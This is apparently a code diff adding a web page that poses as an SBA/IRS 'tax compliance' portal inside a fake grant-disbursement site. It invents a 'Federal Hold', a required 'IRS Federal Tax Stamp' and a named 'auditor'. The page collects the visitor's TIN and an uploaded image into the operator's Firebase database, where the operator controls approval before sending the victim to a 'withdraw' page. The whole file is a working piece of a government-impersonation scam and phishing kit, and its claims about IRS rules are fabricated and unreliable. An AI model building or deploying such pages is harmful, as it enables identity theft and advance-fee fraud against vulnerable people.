@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBA | IRS Tax Compliance</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;700;900&display=swap');
+        :root { --navy: #002e6d; --red: #cc0000; --gold: #b69121; }
+        body { background: #f8fafc; font-family: 'Public Sans', sans-serif; margin: 0; color: #1e293b; -webkit-font-smoothing: antialiased; }
+        
+        .gov-banner { background: #000; color: white; font-size: 8px; padding: 10px; text-align: center; font-weight: 900; text-transform: uppercase; letter-spacing: 2px; border-bottom: 3px solid var(--red); position: sticky; top: 0; z-index: 1000; }
+        
+        #authOverlay { position: fixed; inset: 0; background: #ffffff; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .progress-bar { width: 200px; height: 6px; background: #f1f5f9; border-radius: 10px; overflow: hidden; margin-top: 20px; }
+        .progress-fill { height: 100%; background: var(--navy); width: 0%; transition: width 1.5s ease; }
+        
+        .tax-card { background: white; border-radius: 24px; border: 1px solid #e2e8f0; box-shadow: 0 15px 35px rgba(0,0,0,0.05); overflow: hidden; }
+        .status-header { padding: 30px 20px; text-align: center; border-bottom: 2px solid #f1f5f9; transition: 0.5s; }
+        
+        .bg-delinquent { background: #fff1f2; }
+        .bg-pending { background: #fffbeb; }
+        .bg-success { background: #ecfdf5; }
+        .bg-denied { background: #fef2f2; }
+
+        .label-text { font-size: 9px; font-weight: 900; color: #64748b; text-transform: uppercase; margin-bottom: 5px; display: block; margin-left: 4px; }
+        .input-field { width: 100%; height: 48px; background: #f8fafc; border: 2px solid #e2e8f0; border-radius: 12px; padding: 0 15px; font-size: 14px; font-weight: 700; outline: none; transition: 0.2s; }
+        .input-field:focus { border-color: var(--navy); background: #fff; }
+
+        .upload-area { border: 2px dashed #cbd5e1; background: #f8fafc; border-radius: 20px; height: 180px; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; overflow: hidden; cursor: pointer; }
+        .scanner-bar { position: absolute; top: 0; width: 100%; height: 4px; background: var(--red); box-shadow: 0 0 15px var(--red); z-index: 20; display: none; animation: scan 2s infinite linear; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
+        .btn-main { background: var(--navy); color: white; width: 100%; height: 60px; border-radius: 16px; font-weight: 900; text-transform: uppercase; border-bottom: 5px solid #001a3d; font-size: 13px; cursor: pointer; display: flex; align-items: center; justify-content: center; text-decoration: none; }
+        .btn-main:active { transform: translateY(2px); border-bottom-width: 2px; }
+        .btn-main:disabled { background: #94a3b8; border-bottom: none; cursor: not-allowed; }
+        
+        .officer-card { background: #0f172a; border-radius: 20px; padding: 20px; margin-top: 25px; border-left: 5px solid var(--gold); }
+    </style>
+</head>
+<body>
+
+    <div id="authOverlay">
+        <div class="p-4 border-2 border-[#002e6d] font-black text-[#002e6d] text-xl mb-4">SBA</div>
+        <h2 class="font-black text-[#002e6d] text-[10px] uppercase tracking-widest">IRS Compliance Link...</h2>
+        <div class="progress-bar"><div id="pFill" class="progress-fill"></div></div>
+    </div>
+
+    <div class="gov-banner">IRS Official Compliance Portal • Node 402-TX</div>
+
+    <header class="p-5 flex items-center justify-between">
+        <button onclick="location.href='dashboard.html'" class="w-10 h-10 bg-white rounded-full shadow-sm flex items-center justify-center text-slate-400">
+            <i class="fas fa-arrow-left"></i>
+        </button>
+        <div class="text-right">
+            <p class="text-[10px] font-black text-slate-400 uppercase tracking-widest">Form 1099-G</p>
+            <p class="text-[8px] font-bold text-slate-300 uppercase">Rev. March 2026</p>
+        </div>
+    </header>
+
+    <main class="max-w-md mx-auto px-5 pb-10">
+        <div class="tax-card">
+            <div id="statusBox" class="status-header bg-delinquent">
+                <span id="badge" class="bg-red-600 text-white px-3 py-1 rounded-full text-[9px] font-black uppercase mb-2 inline-block tracking-tighter">Status: Delinquent</span>
+                <h2 id="statusTitle" class="text-2xl font-black text-slate-900 uppercase italic">Federal Hold</h2>
+            </div>
+
+            <div class="p-6">
+                <div id="taxView">
+                    <div class="bg-blue-50 p-3 rounded-lg mb-6 border-l-4 border-[#002e6d] text-[10px] font-bold uppercase leading-tight">
+                        <i class="fas fa-info-circle mr-1 text-[#002e6d]"></i> Grant disbursement requires a valid IRS Federal Tax Stamp for the current cycle.
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-3 mb-4">
+                        <div>
+                            <label class="label-text">Payer ID (TIN)</label>
+                            <input type="tel" id="tinNumber" class="input-field" placeholder="00-0000000">
+                        </div>
+                        <div>
+                            <label class="label-text">Tax Year</label>
+                            <select id="taxYear" class="input-field">
+                                <option>2025/2026</option>
+                                <option>2024</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <label class="label-text">Visual Evidence (Tax Stamp)</label>
+                    <div class="upload-area" onclick="document.getElementById('taxInput').click()">
+                        <div class="scanner-bar" id="scanner"></div>
+                        <img id="previewImg" class="w-full h-full object-cover absolute hidden z-10">
+                        <div id="uploadPlaceholder" class="text-center">
+                            <i class="fas fa-file-invoice-dollar text-slate-200 text-5xl mb-2"></i>
+                            <p class="text-[10px] font-black text-slate-400 uppercase tracking-widest">Scan Official Stamp</p>
+                        </div>
+                        <input type="file" id="taxInput" hidden accept="image/*">
+                    </div>
+
+                    <button id="subBtn" class="btn-main mt-6">Transmit to Auditor</button>
+                </div>
+
+                <div id="pendingView" class="hidden py-8 text-center">
+                    <div class="w-16 h-16 border-4 border-amber-400 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
+                    <h3 class="text-lg font-black text-slate-800 uppercase italic">Validation Active</h3>
+                    <p class="text-[10px] text-slate-500 font-bold uppercase mt-4 px-2 leading-relaxed">Auditor Sarah Miller is verifying your Stamp authenticity via Treasury Node.</p>
+                    <button onclick="resetTaxForm()" class="mt-8 text-[9px] font-black text-slate-400 uppercase border-b border-slate-300">Cancel Request</button>
+                </div>
+
+                <div id="successView" class="hidden py-8 text-center">
+                    <div class="w-16 h-16 bg-emerald-500 rounded-full flex items-center justify-center mx-auto text-white text-3xl mb-4 shadow-lg"><i class="fas fa-check-double"></i></div>
+                    <h3 class="text-lg font-black text-slate-800 uppercase italic">Compliance Verified</h3>
+                    <p class="text-[10px] text-slate-500 font-bold uppercase mt-4 px-4 leading-relaxed">Hold lifted. Your file is now compliant with Federal tax regulations.</p>
+                    <a href="withdraw.html" class="btn-main mt-8 bg-emerald-600 border-emerald-800 flex items-center justify-center">Proceed to Disbursement</a>
+                </div>
+
+                <div id="deniedView" class="hidden py-8 text-center">
+                    <div class="w-16 h-16 bg-red-600 rounded-full flex items-center justify-center mx-auto text-white text-3xl mb-4 shadow-lg"><i class="fas fa-times"></i></div>
+                    <h3 class="text-lg font-black text-slate-800 uppercase italic">Stamp Rejected</h3>
+                    <div class="bg-red-50 p-3 rounded-lg mt-4 mb-6 border-l-4 border-red-600 mx-2">
+                        <p class="text-[8px] font-black text-red-400 uppercase text-left mb-1">Auditor Note:</p>
+                        <p id="denialReason" class="text-[10px] font-bold text-red-600 italic text-left"></p>
+                    </div>
+                    <button onclick="resetTaxForm()" class="btn-main">Retry Submission</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="officer-card">
+            <div class="flex items-center gap-4">
+                <div class="relative">
+                    <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=120" class="w-12 h-12 rounded-xl grayscale object-cover border border-white/10">
+                    <div class="absolute -bottom-1 -right-1 w-3 h-3 bg-green-500 border-2 border-[#0f172a] rounded-full"></div>
+                </div>
+                <div class="flex-1">
+                    <p class="text-[9px] font-black text-gold uppercase tracking-widest">Assigned Auditor</p>
+                    <p class="text-white font-black text-base leading-none mt-1">Sarah Miller</p>
+                    <p class="text-[9px] text-slate-400 font-bold uppercase mt-1 tracking-tighter">Treasury ID: #8829-Compliance</p>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script type="module">
+        import { auth, db } from './firebase-config.js';
+        import { doc, onSnapshot, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+        let compressedStamp = "";
+
+        onAuthStateChanged(auth, (user) => {
+            if (!user) { window.location.href = "login.html"; return; }
+            
+            setTimeout(() => { document.getElementById('pFill').style.width = "100%"; }, 100);
+            setTimeout(() => { document.getElementById('authOverlay').style.display = 'none'; }, 1600);
+
+            onSnapshot(doc(db, "users", user.uid), (snap) => {
+                const d = snap.data(); if(!d) return;
+                
+                const status = d.taxStatus || "IDLE";
+                const views = ['taxView', 'pendingView', 'successView', 'deniedView'];
+                views.forEach(v => document.getElementById(v).classList.add('hidden'));
+
+                if(status === "PENDING" || status === "PENDING_VALIDATION") {
+                    document.getElementById('pendingView').classList.remove('hidden');
+                    updateHeader("bg-pending", "AUDIT ACTIVE", "bg-amber-500", "In Review");
+                } else if(status === "SUCCESSFUL" || status === "VERIFIED" || status === "APPROVED") {
+                    document.getElementById('successView').classList.remove('hidden');
+                    updateHeader("bg-success", "HOLD RELEASED", "bg-emerald-600", "Compliant");
+                } else if(status === "DECLINED" || status === "REJECTED" || status === "FAILED") {
+                    document.getElementById('deniedView').classList.remove('hidden');
+                    document.getElementById('denialReason').innerText = d.taxDenialReason || d.taxNote || "Security Seal could not be verified. Please re-upload.";
+                    updateHeader("bg-denied", "STAMP REJECTED", "bg-red-600", "Action Required");
+                } else {
+                    document.getElementById('taxView').classList.remove('hidden');
+                    updateHeader("bg-delinquent", "FEDERAL HOLD", "bg-red-600", "Delinquent");
+                }
+            });
+        });
+
+        function updateHeader(bg, title, badgeClass, badgeText) {
+            const sb = document.getElementById('statusBox');
+            if(sb) sb.className = "status-header " + bg;
+            document.getElementById('statusTitle').innerText = title;
+            const b = document.getElementById('badge');
+            b.className = badgeClass + " text-white px-3 py-1 rounded-full text-[9px] font-black uppercase mb-2 inline-block tracking-tighter";
+            b.innerText = "Status: " + badgeText;
+        }
+
+        window.resetTaxForm = async () => {
+            try {
+                await updateDoc(doc(db, "users", auth.currentUser.uid), { taxStatus: "IDLE" });
+            } catch(e) { console.error(e); }
+        };
+
+        document.getElementById('taxInput').onchange = (e) => {
+            const file = e.target.files[0];
+            if(!file) return;
+            
+            document.getElementById('scanner').style.display = 'block';
+            document.getElementById('uploadPlaceholder').style.opacity = '0.3';
+
+            const reader = new FileReader();
+            reader.onload = (event) => {
+                const img = new Image();
+                img.src = event.target.result;
+                img.onload = () => {
+                    const canvas = document.createElement('canvas');
+                    const MAX_WIDTH = 500; 
+                    const scale = MAX_WIDTH / img.width;
+                    canvas.width = MAX_WIDTH;
+                    canvas.height = img.height * scale;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                    compressedStamp = canvas.toDataURL('image/jpeg', 0.6);
+                    
+                    setTimeout(() => {
+                        const prev = document.getElementById('previewImg');
+                        prev.src = compressedStamp;
+                        prev.classList.remove('hidden');
+                        document.getElementById('scanner').style.display = 'none';
+                        document.getElementById('uploadPlaceholder').classList.add('hidden');
+                    }, 1500);
+                };
+            };
+            reader.readAsDataURL(file);
+        };
+
+        document.getElementById('subBtn').onclick = async () => {
+            const tin = document.getElementById('tinNumber').value;
+            if(!compressedStamp || !tin) return alert("Compliance Error: TIN and Tax Stamp image required.");
+            
+            document.getElementById('subBtn').innerText = "TRANSMITTING...";
+            document.getElementById('subBtn').disabled = true;
+
+            try {
+                await updateDoc(doc(db, "users", auth.currentUser.uid), {
+                    taxStatus: "PENDING",
+                    taxProof: compressedStamp,
+                    taxPayerID: tin,
+                    taxYear: document.getElementById('taxYear').value,
+                    taxSubmittedAt: new Date().toLocaleString()
+                });
+            } catch (err) {
+                console.error(err);
+                alert("Federal Connection Interrupted. Check internet.");
+                document.getElementById('subBtn').innerText = "Transmit to Auditor";
+                document.getElementById('subBtn').disabled = false;
+            }
+        };
+    </script>
+</body>
+</html>
